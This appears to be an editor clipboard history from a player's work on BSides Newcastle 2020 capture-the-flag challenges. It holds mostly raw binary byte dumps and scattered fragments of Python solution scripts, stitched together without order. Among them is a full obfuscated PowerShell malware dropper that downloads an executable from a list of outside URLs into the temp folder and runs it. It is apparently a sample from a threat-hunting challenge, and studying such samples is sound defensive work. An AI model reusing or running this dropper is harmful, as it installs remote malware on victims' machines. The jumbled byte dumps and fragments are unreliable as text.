	9.9.33.33-> b"Lp\xdeH\xf3J\x8a\x84\r\x9e\xa4\xfd;T\xd0\xdbX\xdb+$y\x94\x92I$u\xac\xe3w)9)\xb8\x8e\xe7\xa1?Z\x85\xa4\x9d\xfa\x92\x07\xa0\xe2\x8b\xa4>^\xec\xd4\x92\xea\xc2\x19\x96b\x9b\xa4D\xd8\xa0\xf2\x00\xef\xc5V\xbb\xd4n/r\x91\xa3\xaceB\x85\x18Q\xf9v\xac\xfd\xa4v\xfa\xf7\xa0\x8f\x94\x96$c\xb98\xe2\x95\xc6\xa2\x85\xb9y\x11\x00\x99\x89\x00cfr?*\xcfc\xb9\x8b\x1eI\xf4\xa7H\xfec\xe7\xb0\xe0\ng>\xb5%\x89\x93\xd7<\xd0Y\x88\xc1n=)H\xa4\xc7\x06\x90\x0e\x8cbT\xc7\\\xf1\xc5il\x8c\xb6C`\xe3\xaf\xa7\xe1TmS}\xc2\xa8\xed\x96\xe0f\xaf\xed$\xe0\xaf>\xe7\x15I\x12\xc3b\x8e\x8e\t#\xde\x97\xe5T\xdcH\x18\x19<\xd2\xed\x00s\xdb\x91\x8e\xdfZ\xa7ur\x92\xae\xc8\xc6y\xf9\x9b\xd7\xe9L[\xb2\t$i\x18\xc8\xddOoJh\xc9\xfaR\x81\x9e1\xd3\xd6\x97\x1d\x80\xa8,E>\xd54\nZe\xe389\xcdE\x8f\xc2\xad\xd8\xa9%\xdb\xd3\x8c\xd5-\xc4\xcb\x1bA\xe0\xaf9\xea;R\x803\xd7\xa7\xbdJ\xa0\x96\xc9_n\x0fZ6\x00I\xdb\xc1\xfd*\xacgr-\xb9<\x91\xf8\xd2\x85'
d617e27374ac6a7c12565d7f88d508f7|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|489|1|v|
	9.9.99.99-> b"\xee|\xfc\xcc\xa7\xef\x0c}i\xa5T\xf4?\x80\xafU\xf8\xbd{\x15\xc6\x8b\xa4y\x0c\xb2%\xc4\x8d4l:2\xed\x1c\xff\x00\xe3\xc2\xbc\xa0\xa1\x04\x921\xf4\xa6\x9d\xd0\x9a\xb3\x18r\xa7\xa7\xe1B\x92\xd9\xc7\xa6}\xeaLq\x8e\xbf^\xb4\x9eR\x93\xb9N\xd6\xcf\xd2\x80\xb8\xdcg9\xfeT\xe0\xbb\xb8\x1c\x1e\xde\xf4\x10\xc8Ha\x9e\xf9\x1c\xd2\x1ey\xce=\xc7j\x05p\x04\x92A\xed\xc7#\xad!\x00r?#\xc5.\xf5 +\x03\x9f\xef\x01\xd2\x97\x04\xaeN\x1b\xdcu\xa0c1\x9f\xa7\xa5&:\xf3\xc7\xa5/\x03\xbe3\xd8\xd2z\x91\xf8\xd2\x18\x99\x03\xdb\xebJ\x08\xf5\xcdz\x07\xc3\x8cj\xfa\x0f\x88|6\xfc\xb5\xc5\xbf\x9b\n\xfa61\x9f\xcfey\xe1]\xa7\x19\xc1\xa4;\x0f,3\xd3\xf14\x9c\x1e\x87\xf0\x06\xbd\x07\xc7_\xf1&\xf0?\x87<<8s\x1f\xda'
6d08f14c2297cafedbd48761e59829c6|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|491|1|v|
	9.9.99.99-> b"\x08\x18\xe1d1\x90\xa7\xe8zUi\xe2VL`\x029\x1c\x8e+\xe8&\xd7\xbc5\xadjW^\x0b\xce\xe7X\xda&\x8c&\x13\x81\xca\xa9\xf5_\xd3\x1e\xd5\xe0\x1a\x9d\x8b\xe9\xba\xad\xd6\x9f>L\x96\xd34lz\xe4\xa9\xc5Ji\x94\xe3mnV\xb7\x96$b\x0bp{\x0ej\xc1\x9a#\xc8\xc9 \xf4\xc5g\xba\x15\x90\xe3\xa7lu\xab)\x96P\xdd2;\xf5\xa6\x98\xac\x8b\x1evy\x0b\xf2\x9e\xfdp}\xc5!wO\x98\x9d\xc8y\xc8\xff\x00\x1a\x84\x12\xa7pl\x11\xd4\x1e\xff\x00QOFR\xc4!\x11\xb7]\xacr\xadN\xe245]\x0e\xff\x00H\x82\xce\xe6\xf1\x00\x83P\x84O\x03\x06\r\x95 \x11\x9ct\xea+9\x8b'
fdaa12c7483ed4c265deaa9eddd7e2f3|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|499|1|v|
	9.9.33.33-> b"\x13\x9awB\xe5e\xb6F\x1fz\x1c\x81\xdf\x14\x80FN6\x81\x8fZ\x85n\xd8u\xc9>\xcc\x7f\x95<^\xe3\xacJ\xde\xc7\xfch\xd0\\\xac\x93j\x0e\x81q\xf4\xa0\xa1?uF=A\xe6\x90]\xc2\xdfz\xdfo\xae\xd6\xebR\x07\xb5la\xd9s\xd8\xf1\x8f\xc6\x9d\x90\xac\xd1\x16\xccs\xb4\xd2\x1f,pCU\x9f\x90t}\xc3\xdb\x9an\xf0N\x03\x8c\xfa\x1cQ`\xbb+\xfc\x9d\xb8\xcf\xe9N\xc2\x902qS\x1d\xd8\xff\x00V\xad\x9e\xa4\nn\xd0G\xfc{\x92\x07R\x1b\x14X.BQ\x0f\xf1}3K\xe5\xaf\x1c\xfe4\xfd\xa8\xdc\x04u\xf4\xc9\x14\xbeR\x91\xd5\xfd\xf1\x83@\xeeC\xb5s\xd78\xa5\xda\xbc\xf1\xc7\xb1\xa9D1\x8e\xacq\xee0E\x02\x14=\x1b\x1fZ\x02\xe49Q\xd1s\xf5\xa3\x0c\x7f\x84\x0f|\xd4\xc5\x10\x1c\x19\x01\x03\xdcP\x04#\xf8\x93>\xa5\xa9X\x08\xb6\x12z\x81\xf8\xd1\xb0}O\xb5O\x98\x07\xdee\xfa\xd0^\xd9O\xcar}\x81\xa2\xc2\xbb+\xed^\x9dH\xebF\xc2q\x81\xfaT\xfedG\x1f63\xdfo\xf5\xa7\x01\x13\x0ee\xcf\xd4\xe2\x8b\x0e\xec\x83\xca\xc1\xe7\xf5\xa4\xc0\xe8\x07\xe5V\x0cQ\x9eD\x83\xf19\x14\xd3\t'
e18ec6720f7c583eb952e17bbd582931|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|507|1|v|
	9.9.99.99-> b"v\xe8\xa5\x8e$\x04\xa0\xc9\xf4\xfb\xd5-\xf6)-u<\xebZ\xd05=\x02X\xa1\xd5\xad>\xcf$\xaaY\x07\x98\xaf\x91\xd3\xf8I\xac\xcf,\xbb\x05@w\x13\x80=ks\xc5\x9e/\x9b\xc5\xb7V\xf3\xdcZGn`B\x80F\xc4\xe7'
64eb877815e7e2fbb33256a12e2086ff|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|511|1|v|
	9.9.99.99-> b"8\xd6\xe4\x85Q\xde\xcd\xa4*\xa7\xa6VC\x80\x7f\xe05\x1a\xd8\xd3K\x9cW\x87\xb59\xa0\xf1\x8e\x9f\xa8\xb3\xe6Cz\x8f!\xf5\x0c\xdf7\xe6\t\xad/\x8a6\xdfe\xf1\xed\xfe\xd5\xc2\xca#\x94~(3\xfa\x83\\\xc42\x18\xa6IB\xe4\xa3\x06\xc6}+\xbd\xf8\xbbn\xed\xe3\x88\x164\x0c\xf7\x16\x91\xed\x03\xa9;\x99\x7f\xa5WRz\x1c\xef\x87\xfe\x1fk\xfe*\xb2k\xdb\x18\xe2\x8e\x04%VI\xdfhr:\x85\xe0\xe7\xeb\xd2\xb0o\xb4\xfb\xcd&\xfek\x0b\xe8Z\x1b\x88\x1bk\xa3v\xff\x00\x11\xef^\xcd\xe2\x9f\x19\x1f\x87\xb0i\x9a\x06\x95k\x04\xef\r\xba\xb4\xbenp\x17\xa7\x18#\xe6$1\xcfoC\x9a\xe6\xfe,Gi\xaaY\xe8~*\xb4B#\xbe\x87\xcb\x93\xd8\xe3r\x83\xee2\xc0\xfd*o\xa9]\x0f8\xdcGS\xfdh\xdd\xc0\xcf\xe5F\x00?\xe1\xde\x93i\xcfRA\xf5\xa6I\xdf\xfcB\x94\xa6\x85\xe1\x000A\xd2\x93 \x8e\xbf*V/\x86<9\xa9\xf8\xb6i-\xec\xad\xd5\xa2\x84\x0f2Y[j\xc7\x9e\x9c\xfa\xfd+_\xe22\xe7B\xf0\x80\xce?\xe2T\x9c\xff\x00\xc0R\xba;Ml|9\xf8c\xa5\xc9m\x04R\xea\x1a\x99\xf3\xc0\x97;N\xe0\x0e\xe3\x8c\x13\x85\xd81\x9e\xf4&\xd2\x1bI\xeep\x1a\xff\x00\x86u?\r\xde}\x93P\x84J6\xeeR\xad\x96\xdb\xea\xa7\xbdw\xbf\nu\x01c\xe1}Z\xef\xcd\xde\x91\\\xc5\xb8\xb0\xc1\x0b\xc09\xfc\t\xa8\xfc[\xa8'
fa92e56408f51f2cde3fec5596ff67a3|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|517|1|v|
	9.9.33.33-> b"`\xf5\x00\x02q\xef\xd2\xa5\xf8\xa5\xa7\xc7e\xe3\x8b\x92\x98At\x896\xd1\xc0\xc9\x18'
a43db5ec0b4fb3ba64d35a01ea024577|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|521|1|v|
	9.9.33.33-> b"O\x864=^=:\t$\xd4\xd1\xd9\xe3g &1\xd3\xf3\xaek\xe1\xfe\xad'
60a9ae13caf15bd4c9f3b9dfbfb8ebef|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|525|1|v|
	9.9.33.33-> b"\xf8q\xf68\xfe\x1e\xcd{~qoa~\xf7L1\x9c\x94E#\xf1\xce\x0f\xe1Y\xd6~;\x9b\xc5\xfe1\xd0\xe1\x96\xca;e\xb7\xbd/\x19G,J\x95\xc6\x0f\xbf\x1dh\xb8Y\x1c\xd6\x8f\xf0\xff\x00_\xd6o/-\xa2\xb7\x8e&\xb2s\x1c\xcd,\x80*\xb8\xfe\x10Fr~\x95\x89\xa8i\xf7ZU\xfc\xd67\x90\x98n m\xae\x87\x9c\x1f\xea+\xd6\xfcO\xe3\x84\xf0F\xaa4\xbb\x0b8\xeed\x96W\xba\xbbg$}\xf6$\x01\x8e\xf8\xc7'
c1b485e0426f832c5a0a8e81ac1e2efc|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|555|1|v|
	9.9.33.33-> b"4u;\xea\x8b\xbbZ>\xc5m>7\xbf\xf81\xa9G\xb4\x97\xb3\xbe\x12\x00?\xbb\xf2r?6\xfc\x8dA\xf0\xabM\x92o\x1a[\xdc\x86\x0c\x96\xd1I!\xe7\x91\x95\xdb\xff\x00\xb3V\xaf\xc3\x1b\xbd6;\xeb\xed\x16Fc\x06\xa3\x16\x04r\x9e\x0b\x0c\xe5G\xd4\x13\xf9Wa\xa5\xe8z?\x83/\xe1\xb7\xb2\xde\xf7Z\xa4\xdb7I\x82\xc1\x14\x16=\x00\xe3\xb7\xe2(z]\x0e:\xd9\x9cG\x86\xe6[_\x8c\xd7~`h\xfc\xeb\xdb\xa4\x04\x8e\x1b%\xc8\xfd@\xaeW\xc4zd\x9ag\x88\xb5\x0bf\x8f\xe5\x8e\xe1\xf6\xf1\xd5I\xca\xfe\x84V\xae\xadq\xa8\xe9\xde6\xbd\xbd\x80\xc7p!\xd4e\x91\x15\xbeVR$'
136f4c98b615390442fffcbe982692bb|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|559|1|v|
	9.9.33.33-> b"\x1f\xea\xaa\xaaX\x99G\x00g\xf8\x05g\xf8O\xfeG\r\x17\xfe\xc2\x10\x7f\xe8\xc5\xae\x9bW\x9a\x18>6\xf9\xb3\xc8\x91\xc4\x9a\x84E\xdd\xc8\n\x06\x17\xa94\x87\xd0\xe0\xab\xd2<}\x01\xd2\xbe\x1cx[K\x90m\x94\x83+/pv\xe4\x8f\xceJ\xefG\xc3?\n\x1dYu5\xb0!\x83y\x82\x15s\xe5\x16\xces\xb7\xd3\xdb\xa7\xb5y\x7f\xc5O\x11C\xae\xf8\xa3\xc8\xb4\x90Im`\x9eR\xba\x9c\x86|\xe5\x88\xf6\xe8?\xe04^\xe3\xb5\x8e'
8d706ec5ce35994cc1c9d83cf3954b8f|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|561|1|v|
	9.9.33.33-> b"w\xb8\x01\xbf\xf6\x7f\xe7U~#7\xfcH\xfc!\x91\x9c\xe9I\xff\x00\xa0\xa5t\xde\x0b\x87K\xf1\xf7\xc3\xf4\xd05\x17e\xb8\xd3_\x01\x91\x80\x91G;\x18dt\xc1+\xf8}*nU\x8c?\x08\xa9\xb1\xf8]\xe2\x9dM\xd7j\xdc\x05\xb7R{\xf1\x8f\xe7%\x1e\x10\xc9\xf8[\xe2\xac\xfb\x7f!Z\x1f\x13g\xd3\xbc1\xe1K\x0f\x07\xe9lr\xcc%\x94\x16\xcbl\x04\x9c\xb7\xbb1\xcf\xfc\x07\xe9Y~\x0fb~\x15\xf8\xb3\xdbo\xf2\x14\\v*|'
9057808ecdc3ac5a024b8dd7b35bbe4f|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|567|1|v|
	9.9.33.33-> b"K\xaa\x7f\xd7\xe4\xdf\xfa\x19\xae\xb3\xe2\xc9\xff\x00M\xd0\xbf\xec\x17\x1f\xf35\xc9x\x89O\xfc$\xba\xa78\xff\x00L\x9b\xff\x00C5\xd7|Y\x07\xed\x9a\x11\x1d\xb4\xb8\xff\x00\x99\xa9\x1d\xc3K\xe7\xe0f\xb1\x8f\xfa\n/\xf2\x8a\xa8\xe8\xff\x00\x14|A\xa0\xe9\x16\xfae\xa2Y\x98-\xc1\x08d\x88\x96\xe4\x93\xc9\xdd\xefWt\xbc\xff\x00\xc2\x8c\xd6?\xec*\xbf\xca*\xe0H,=\xe8J\xe0\xd9\xed~\x1f\xf8\x81\xac\xea~\x07\xd7u\x9b\x84\xb5\x17:~<\x90\xb1\x90\xbd;\x8c\xf3\\o\x80uK\x8dg\xe2\xd5\x9e\xa3u\xb0Mr\xf3;\x84\x18\\\xf9/\xd0U\xbf\x06\x82\xbf\n\xbcY\x9f\xf6\x7f\x90\xac\x9f\x85\xbf\xf2Q\xf4\xact\xfd\xf7\xfe\x89z\x07}\x8c/\x11\x7f\xc8\xcb\xaa\x7f\xd7\xe4\xdf\xfa\x19\xae\xbb\xe21\xc7\x86\xbc\x19\xff\x00`\xb5\xff\x00\xd0#\xaeG\xc4 \xff\x00\xc2M\xaa|\xa4\x8f\xb6M\xff\x00\xa1\x9a\xeb\xbe#\x8f\xf8\xa6|\x18px\xd2\xd7\xff\x00@\x8e\x81\x16\xfe\x19[\r{\xc3^ \xd0\x1c\x02$h%U=\xfen\x7f\xf4\x15\xac\x9f\x8b7\xa6\xe7\xc7\xf7q\xe7+o\x1cq\x0f\xfb\xe41\xfdX\xd5\xdf\x82\xf7~G\x8ce\x80\x9e.m\x1dq\xee\n\xb0\xfd\x01\xaeS\xc5\xd7&\xff\x00\xc5\xda\xb5\xd09W\xbb\x93i\xff\x00d1\x03\xf4\x02\x8e\xa1\xd0\xcb\xc9=\xb3\x9e\xb4\x84\x0f\xfe\xb7\xa57\x0c9\x1c\x7fZ2O'
b34923ae1d0178f52de97da2ab2e9b66|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|569|1|v|
	9.9.99.99-> b"?\xe2w\xa5|\xd8\xff\x00\x89ru\xff\x00y\xa9\xbf\x13\x7f\xe3\xcb\xc3\x1d?\xe4\x16\x9f\xc8S\xbe1.u\xcd+\xfe\xc1\xc9\xff\x00\xa15E\xf1<\x7f\xa1\xf8_\xfe\xc1i\xfc\x85$7\xd4w\x83\x7f\xe4\x9cx\xbf\xfe\xb9\xc7\xff\x00\xb3T\xbe\x19\x84\xea\x9f\x08\xbcG\xa7\xc67Km:\xdc\x81\xdc\x00\x14\x9f\xd1\x1a\xa2\xf0`?\xf0\xae<_\xff\x00\\\xe3\xff\x00\xd9\xaa\x0f\x85^!\x83C\xf1\x1c\x96\xd7\xd2,vz\x84~S\xb3\xf0\xaa\xe3\x95'
f04aedbad76ec595977609a5ba892938|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|573|1|v|
	9.9.99.99-> b"J\x9fCA|}\xe5\xc0\xf5\x14a\x1b\xa1\xfc\xe9\x0c\x88\xab\x1e\xad\xfdh\x08\xa0|\xc4\x93\xe88\xa7\xb0 d\x00>\x94\xdc\x93\xfe\x19\xa412\xa0\xfc\xa3\xf3\xa4\xdcq\x80)N\x01\xe7\xfci:\xd01:\xf2Nh\xc5/8\xa4\xe4\x0e\x94\x00c\x14Q\xd6\x8cP\x00N(\xcd%/N\x94\x00g\xde\x97\x1e\xb4\x94P\x02\xfd)zSipOJ\x00\\\x93I\x9fZL\x91\xc5\x1d>\xb4\x00\x13K\x92i\x9b\x81\xfa\xd2\xee\xc0\xa0v\x16\x974\xdd\xc0\xf7\xc5/\xb6h\x10\xec\xf3\x8a8\x15\x1b\x92\x08\xa5V<\xd0\x03\xb2\x07l\xd2\xe7\xa0\x00sL\x04\x9c\xf6\xa6\xaba\xf9=\x0fz.;\x13d\x82\x0e1\x9e\x94\x87'
731da273da7f3c545041daba7de05054|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|575|1|v|
	9.9.33.33-> b"\x978\xf4\xe0S\xb0;\xb2K{\x05\x82-\x8f'
2b91f13775fb5169be32e3acf5374737|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|579|1|v|
	9.9.33.33-> b"\xf5.7Z\x0e2\xb3\xb9{\xc5:F\xa1\xa4\xeb7\x86\xe6\xcex\xa0{\x87\x10\xccT\x94|\x92F\x1b\xa7N\xd5\x86\xef\xb0\xfc\xc0g?t\x802>\xb5\xdax\xb3\xc7+\xe2M&\xde\xd4\xd8\x98f\x8a_1\x88}\xca\xdf)\x1cq\xef\\\\\xca%p\xeaA$a\x90\xff\x00J\x95{j[\xb5\xf4!\x91\xd9\xceI\xf2\xc1\xe0(\xed\xf8\xd4[\x1bv\x08\xc6?_\xa5M\xb0\xf1\xb4\xe5O\xdeV\xea1\xe8i\x84\x95\xf9q\x902Cz}i\x0co\x97\xc6z\x8e\xd8\xa5\x8d\xde)\x16H\x99\x91\xd0\xe5YN\x08>\xa0\xd2\xe5\xb7)\x03i=@\xefN`\x0bf1\x9c\x9eTpE\x16\x0b\x8e\xbd\xd4u\rE\x90\xdf_\\\xdd\x14\x18_>V}\xbfL\x9a\xad\x8c\xb6*b\xa8\xed\xb5\x18o\x1dA\x18\xcdv\x9ag\xc2\x9dWT\xd2\xed\xaf\xe3\xbf\xb4E\xb8\x8ddUm\xd9\x00\x8c\xe0\xf1I\xd9\x14\xae\xce\x10\xae(\xd8q\x9c\xe35\xe8\xa7\xe0\xd6\xb0\xc0\xe7S\xb2\xe7\xfd\xff\x00\xf0\xae\x06\xf6\xd1\xec\xae\xe6\xb5b\x19\xe0\x95\xa3$t$\x1cg\xf4\xa14\xc7f\xb7+\xec'
a18b75f7dfa72d1d3ed8d29445292309|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|583|1|v|
	9.9.99.99-> b"\x82\xe6H%Y\xed\xe5x\xa5C\x95t%YO\xb1\x15Sx\xe9\x8a_0\x83\x9c\xd1p\xb34\xafumGSek\xfb\xfb\x9b\xb2\x9ft\xcf+I\xb7\xe9\x93Urpq\xde\xa0\xf3[\xb0\xae\xa7\xc1\xde\n\xbf\xf1\x9a]\xbd\x9d\xd5\xbc\x1fe(\x1b\xce\xdd\xce\xec\xe3\x18\x07\xfb\xb4]\n\xcc\xe6\xd9\t\x19\x07\x9aEc\x1b\x06\x0eU\x94\xe4\x10pA\xafJ\xff\x00\x85)\xaf\x0f\xf9\x89\xe9\xff\x00\xf8\xff\x00\xff\x00\x13\\\x97\x8c<)w\xe0\xfb\xe8-o'
3929098ac0ad03ddb1047f0fdff2d076|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|589|1|v|
	9.9.99.99-> b"lb\xeeE\xfa\xe0\xe3\xfaWA\xe1\x8f\x89\x83\xc2\xfe\x15\xfe\xca\xb6\xd3\xfc\xdb\x9d\xee\xcb+\xbe\x11s\xd3\x8e\xa7\xe9\xc5p\xd2\xc8\xf3\xca\xf2\xcd/\x99#\xb1fs\xd4\x93\xd4\xd2\x1fA\x98'
a2552d2e3f419a3e3014359113818483|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|591|1|v|
	9.9.33.33-> b"\xf5\xb8\x97\xe80\x05'
49ce8c7d60f71d7f475c49d357059ed8|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|599|1|v|
	9.9.99.99-> b"/\xfe&\xa1\xbc\xf8\x95\xe2\xdb\xfb)\xec\xee5Ex.#h\xa4_\xb3\xc47+\x0c\x11\x90\xb9\x1c\x1a\xe5\xf0\xa3\xb1\xfch\xc0\x1d\xa8\xb0\\L\x11\xff\x00\xd6\xa4\xc7=qRc\xad7i'
5fc12bcb07c93118bfd22b1b77f4278c|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|601|1|v|
	9.9.33.33-> b"\xfa\xd3@FFA9\xcd1\x01c\x8f\xd2\xacm\xc7\x1e\xb4\xe5\x08\x80\xed\x18?J-\xa8\xaeWd!@\xc7|T\xd1\xc2^3\x91\x81N\xdd\x96\xc9\x19\xfe\x86\x9d\xe6>8Zb\xbe\x84\x12Z\xba\x02I\x18\xc8\xc0\xeb\x9a\x9c\xda\x802O w\xeb\x9aL\xb99\xfc\x8fZ>l`\xb6~\xa2\x84\x83\xa1\x1cp2M\xb8.v\x91\xd7\xbd[\xda;\x8ej\x1c\x91\x8e\x7fZP\xe4t4\xd6\xc0\xf5\x1eP\x1eH#\x9e\xd4\x98Q\xc6\x0f\x1e\x94\xdf4\xe7\x93J$\xf6\xc9\xa0V\x1c\x00#\xe5\x06\x8d\xa4\x8f\x95q\xeei7\xb6z~\x14\xbek\x01F\x80/\x94\xf9\xe2\x97\xec\xd2\x1eY\x80\xf6\xa6\x9b\x9c\x0eN}i\xbfjL\xf4'
78b9f00162218d94fd9aa2c69c499801|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|603|1|v|
	9.9.99.99-> b"\x14\xce\x9c\xd1\x9f\xc2\x80$\x122\x9c\xd2\xf9\xb99=j*)\xdcD\xdb\xc1\xa5\xc9?J\x83\x02\x9e\t\x1d\xf2(\xb8\xacI\x9c\x1eis\xdf\xf4\xa8\xc3\xe3\x8cS\xd4\xa9\xe0\x9eOJb\xb0\xbe\xfdh\xa7m \xe1FN;\x0e\x82\x94.\xe1\xc0\xefN\xc02\x97\x04\x8a~\xd0\x0e\xd02i\xce\x840\x19\x1f\x87\xf2\xa2\xc2\xb9\x161N\xec)\xe6=\xaa\xbe\xfd\x8f\xa5\x1eY,T\x0eGZ,\x17\x19\x93\x81\x8avN)DM\xdcc=>\x94m<\xf1\xc6q\x9av\x01\xb9\xc9\x1cqN\x07\x1c\xfe\x94\xe6\\(\x00\xf3\xd7\xe9Lc\xb4g\x18\xf4\xa0\x05f8\xf74\xcd\xa4\xe3\xda\x9a\tg\x00\x9e\xb5c\x00\x8c/j\x94!\x98'
ea59a8f3dbf9d599003bc3936c50b435|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|615|1|v|
	9.9.99.99-> b"Q@\x05\x14}h\xeb@\x0b\x93GZL\xd2f\x80\x178\xa5\xcf\x14\x99\xc5\x19\xa0\x05\xa39\xa4\xcd\x14\x05\xc5\xce{\xd2p(\xa3\x14\x00f\x8a1F=h\x00\xa3\x19\xa4\xe0Q\xc5\x00;\x03\xd7\x14`\x0e\x94\x80\x8fJ\\\x81\xd0b\x8b\x082=3F}\x17\xf1\xa5\xcey\xa3v8\xa7`\x0eh\xda\xc7\xbe(-\x8an\xee\xd9\xa3@\x1f\xb4\x01\xc9\xfc\xa92\xa3\xbei\x99&\x97\x9a4\x01\xdb\xc0\xf7\xa3~z\x0cS0;\xf3K\x8fNi\x01c\x01z\xad\x19R\xdfw'
fc1aa0992a6f090c65aceff9a3bc2794|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|617|1|v|
	9.9.99.99-> b":qFH\xe6\x90t\xa5\xed\xf8\xd3\x10n\xc7^iw)\x03\x8aJ(\x01\xd8S\xdf\xf0\xa0\xb0\xe6\x9az\xd1B\x01A\xcf4\xe0x\xf4\x1d\x85\x1d\xa9O\xdf\xfc(\x10\xa0\x9cf\x97,z\x1ei;\xd1@\x85\xf3\x18w8\xf6\xa7\tT\x11\x9c\x81M\x14\xd6\xa7p\xb11to\xba\xddz\xe6\x9a\xcd\xb4\x109\xcfO\xa5C\xe9N'
cf576fda31b221c93e53664ef9240ed5|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|619|1|v|
	9.9.99.99-> b"\xe7\xaf\x1e\xf4\xd6\xc8\xef\x9au'
9c7bf9606708174c2789ab9766ccf814|file:///home/neo/CTFs/bsidesncl2020/areyoualive/sol.py|1|11|v|python
	flow.txt
b5359f96e84a0f0a7935c24376d720be|file:///home/neo/CTFs/bsidesncl2020/areyoualive/sol.py|6|14|V|python
	    inst = line.count('xc3')
	    if inst < 10:
	        print(line)
70c279ee0a093edd6f0b2a119453f14c|file:///home/neo/CTFs/bsidesncl2020/areyoualive/sol.py|5|1|V|python
	for line in lines:
1212d40a322a9719c9decb4f9f38d903|file:///home/neo/CTFs/bsidesncl2020/areyoualive/sol.py|1|11|v|python
	\xff\xd8\xff\xe0\x00\x10
ab9c3ecddad3ca12da6192fe0d94c507|untitled:1|1|1|V|
	${W`sCR`IpT} = .("{0}{2}{1}" -f'new-ob','t','jec') -ComObject ("{0}{1}{2}"-f'WScrip','t.Shel','l');${w`EBc`lIeNT} = &("{1}{0}{3}{2}"-f'ew-o','n','ect','bj') ("{5}{1}{3}{0}{4}{2}"-f'bCli','W','t','e','en','System.Net.');${R`A`NDOM} = &("{2}{0}{1}"-f 'ob','ject','new-') ("{1}{0}" -f'm','rando');${u`RLs} = ("{23}{15}{19}{1}{13}{16}{8}{18}{27}{10}{29}{12}{5}{25}{17}{2}{0}{21}{28}{11}{6}{14}{4}{3}{9}{7}{22}{20}{26}{24}" -f 'ttp://a','bo','/lEYJk/,h','rixm','//globalmat','tu','t/VWKngh/','et','/daze','ark','om.hk/ya','p','http://funkys','nnieja',',http:','//mis','ne.com/H/,http:/','org','.','s','g.co','rdw','in','http:','/HXApJj/','dio.','m','c','eb.','eRXq/,').("{1}{0}"-f't','Spli').Invoke(',');${n`AME} = ${r`AndOm}.("{1}{0}"-f 'ext','n').Invoke(1, 65536);${p`ATH} = ${env`:te`mP} + '\' + ${n`AMe} + ("{0}{1}" -f '.ex','e');foreach(${u`RL} in ${u`RlS}){try{${WEBC`L`IenT}.("{0}{3}{1}{2}"-f'Down','F','ile','load').Invoke(${U`RL}.("{0}{1}{2}" -f'ToS','tri','ng').Invoke(), ${P`Ath});.("{0}{2}{1}{3}" -f 'St','s','art-Proce','s') ${Pa`Th};break;}catch{&("{3}{2}{0}{1}" -f'e-','host','rit','w') ${_}."E`xcePtI`ON"."m`essA`GE";}}
85eb107ec23396f0b6e3b5c881fa8062|file:///home/neo/CTFs/bsidesncl2020/just/sol.py|2|18|v|python
	bride
37da5a0d9cbb506aeb54003c9b22951b|file:///home/neo/CTFs/bsidesncl2020/just/sol.py|4|1|V|python
	print(im.height)
d5fdb8af2a76216bf951644b04a28b01|file:///home/neo/CTFs/bsidesncl2020/just/sol.py|6|1|V|python
	print(pic)
ae2bef1511f928c25a804284b6afdd27|file:///home/neo/CTFs/bsidesncl2020/just/sol.py|8|54|v|python
	myarray
374e452cd764103a0788c1742a4c7902|file:///home/neo/CTFs/bsidesncl2020/just/sol.py|13|1|V|python
	new_pic = ''.join(new_pic)
11a90f3b8ca005f3493fdfafa72bd340|file:///home/neo/CTFs/bsidesncl2020/just/sol.py|15|1|V|python
	print(new_pic)
3bdbdaa8a5889d758cdcf64ca6a4db75|file:///home/neo/CTFs/bsidesncl2020/just/sol.py|19|1|V|python
	plt.imshow(new_img)
7d9360c21b198ec5c48efe88fd4793fa|file:///home/neo/CTFs/bsidesncl2020/just/sol.py|21|1|V|python
	image = Image.fromarray(new_img)
2dd78e4ae69c5fe74a15492c7e2720bd|file:///home/neo/CTFs/bsidesncl2020/just/sol.py|20|1|V|python
	Image.fromarray((x * 255).astype(np.uint8))
9a2de6c9622541a6cf1f1f7d55fc5b6a|file:///home/neo/CTFs/bsidesncl2020/just/sol.py|12|5|V|python
	    print(i//16)
91e8154388ca2d92d8a1baa00bc64bfa|file:///home/neo/CTFs/bsidesncl2020/just/sol.py|22|15|v|python
	shifted
2ba8fe2adca4aaa7b40472cfc45c12bb|file:///home/neo/CTFs/bsidesncl2020/just/sol.py|22|9|V|python
	        print('shifted')
aad2003b13ad05470368aca476cd828e|file:///home/neo/CTFs/bsidesncl2020/just/sol.py|20|10|v|python
	% 192 == 191:
39ed7002244acfb76a119fc80a912f07|file:///home/neo/CTFs/bsidesncl2020/just/sol.py|20|8|^v|python
	i == (im.height//3)
1aafddebc65713838aa7f097ab072749|file:///home/neo/CTFs/bsidesncl2020/just/sol.py|20|26|V|python
	    if i == (im.height//3) or i == 2*(im.height//3):
	        shift = shift + 20
14fc1a26af469ecbb92a4e8bacf1b729|file:///home/neo/CTFs/bsidesncl2020/just/sol.py|19|1|V|python
	for i, row in enumerate(pic):
	    for j in range((i//16) * shift):
	        row = row[-1:] + row[:-1]
	    new_pic.append(row)
f4923a48c8242bc8290b11e5316b9743|file:///home/neo/CTFs/bsidesncl2020/threathunting/mal|1|1|V|
	GET /EV990701zD HTTP/1.1
	Host: canlibets10.com
	Connection: Keep-Alive
	
	HTTP/1.1 301 Moved Permanently
	Date: Thu, 30 Aug 2018 12:52:30 GMT
	Server: Apache
	Location: http://canlibets10.com/EV990701zD/
	Content-Length: 242
	Keep-Alive: timeout=5, max=100
	Connection: Keep-Alive
